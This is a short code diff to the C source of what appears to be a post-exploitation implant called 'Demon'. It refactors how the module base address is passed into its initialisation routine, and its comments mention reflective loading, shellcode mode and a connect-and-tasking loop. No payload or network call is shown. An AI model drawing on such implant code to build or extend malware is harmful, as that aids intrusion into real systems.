@@ -31,16 +31,11 @@ SEC_DATA BYTE     AgentConfig[] = CONFIG_BYTES;
  * 4. Parse config
  * 5. Enter main connecting and tasking routine
  *
- * */
+ */
 VOID DemonMain( PVOID ModuleInst, PVOID ReflectiveLdrAddr )
 {
-    /* Use passed module agent instance */
-    if ( ModuleInst ) {
-        Instance.Session.ModuleBase = ModuleInst;
-    }
-
     /* Initialize Win32 API, Load Modules and Syscalls stubs (if we specified it) */
-    DemonInit();
+    DemonInit( ModuleInst );
 
 #ifdef SHELLCODE
     /* Free the reflective loader if we are shellcode */
@@ -262,7 +257,7 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
     PackageAddInt32( *MetaData, Instance.Config.Transport.WorkingHours );
 }
 
-VOID DemonInit( VOID )
+VOID DemonInit( PVOID ModuleInst )
 {
     OSVERSIONINFOEXW             OSVersionExW     = { 0 };
     SYSTEM_PROCESSOR_INFORMATION SystemInfo       = { 0 };
@@ -481,6 +476,8 @@ VOID DemonInit( VOID )
     if ( ! NT_SUCCESS( SysNtQuerySystemInformation( SystemProcessorInformation, &SystemInfo, sizeof( SYSTEM_PROCESSOR_INFORMATION ), 0 ) ) ) {
         PUTS( "[!] NtQuerySystemInformation Failed" );
     }
+
+    Instance.Session.ModuleBase = ModuleInst;
 
     /* if ModuleBase has not been specified then lets use the current process one */
     if ( ! Instance.Session.ModuleBase ) {
